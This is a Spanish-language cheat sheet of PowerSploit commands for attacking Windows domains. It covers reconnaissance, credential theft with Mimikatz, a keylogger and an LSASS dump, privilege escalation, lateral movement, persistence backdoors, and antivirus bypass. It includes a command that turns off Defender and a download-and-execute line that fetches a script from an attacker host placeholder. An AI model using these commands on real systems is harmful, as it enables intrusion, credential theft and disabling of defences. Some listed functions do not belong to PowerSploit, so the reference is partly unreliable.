
# 🛠️ PowerSploit Cheat Sheet

## 🔎 Enumeración (Reconocimiento)

### Recon/Recon.ps1
- `Get-NetComputer` — Enumera todos los equipos del dominio.
- `Get-NetUser` — Lista los usuarios del dominio.
- `Get-NetGroup` — Lista grupos del dominio.
- `Get-NetGroupMember -GroupName "Domain Admins"` — Miembros del grupo "Domain Admins".
- `Get-NetDomainController` — Enumera los DCs.
- `Get-NetShare -ComputerName <hostname>` — Enumera recursos compartidos en un host.
- `Get-NetSession -ComputerName <hostname>` — Sesiones activas en el host.
- `Get-NetLoggedon -ComputerName <hostname>` — Usuarios logueados en el host.
- `Get-UserProperty -UserName <user>` — Atributos del usuario.
- `Invoke-UserHunter` — Busca usuarios con privilegios en máquinas específicas.
- `Invoke-StealthUserHunter` — Igual que el anterior pero con menor ruido.

---

## 🔐 Credential Access

### Exfiltration/Credentials
- `Invoke-Mimikatz` — Ejecuta Mimikatz desde PowerShell.
- `Invoke-CredentialInjection` — Inyecta credenciales en un proceso.
- `Invoke-TokenManipulation` — Manipula tokens.
- `Get-Keystrokes` — Keylogger por PowerShell.

---

## 🚀 Escalada de Privilegios

### Privesc/PowerUp.ps1
- `Invoke-AllChecks` — Ejecuta todos los chequeos de escalada.
- `Get-ServiceUnquoted` — Servicios con rutas sin comillas.
- `Get-ModifiableServiceFile` — Archivos de servicios modificables.
- `Get-RegAlwaysInstallElevated` — MSI con privilegios (bypass UAC).
- `Invoke-ServiceAbuse` — Automatiza explotación de servicios.
- `Get-ScheduledTask` — Lista tareas programadas.
- `Get-ProcessTokenPrivilege` — Lista privilegios de procesos.

---

## 🏃‍♂️ Movimiento Lateral

### CodeExecution/Invoke-Command/Invoke-WMICommand.ps1
- `Invoke-WMICommand -ComputerName <target> -Command "cmd.exe /c whoami"` — Ejecuta comandos vía WMI.
- `Invoke-SMBExec -Target <target>` — SMB Exec.
- `Invoke-PSRemoting` — PowerShell remoto (requiere WinRM).
- `Invoke-DllInjection` — Inyección de DLLs.

---

## 🧱 Persistencia y Backdoors

### Persistence/Persistence.ps1
- `New-LocalUserPersistenceOption` — Backdoor con cuenta local.
- `Install-ServiceBinary` — Reemplaza binario de un servicio.
- `Invoke-RegistryBackdoor` — Claves de registro persistentes.

---

## 📡 Pivoting & Port Forwarding

> PowerSploit no incluye directamente port forwarding.

Alternativas:
- `Invoke-ReflectivePEInjection` + herramientas como `plink.exe`.
- Usar `Invoke-Socat` o `Invoke-TcpTunnel` de otras fuentes.

---

## 🧩 Módulos Útiles Adicionales

- `Invoke-ReflectivePEInjection` — Carga binarios en memoria.
- `Invoke-Encode` — Codifica comandos en Base64.
- `Out-Minidump` — Saca minidump de LSASS.

---

## 🛡️ Bypass de Antivirus y AMSI

- `Invoke-Obfuscation` — Obfuscación de scripts.
- `Set-MpPreference -DisableRealtimeMonitoring $true` — Desactiva Defender.
- Cargar PowerSploit en memoria:
  ```powershell
  IEX (New-Object Net.WebClient).DownloadString('http://<attacker_ip>/PowerSploit.ps1')
  ```

---

## 📁 Referencia Rápida: Archivos de PowerSploit

| Carpeta                | Funcionalidad Principal               |
|------------------------|--------------------------------------|
| `Recon`                | Enumeración de red y dominio         |
| `Exfiltration`         | Robo de credenciales / información  |
| `Privesc`              | Escalada de privilegios              |
| `Persistence`          | Mantenimiento del acceso             |
| `CodeExecution`        | Ejecución remota                     |
| `AntivirusBypass`      | Evasión de AV/AMSI                   |
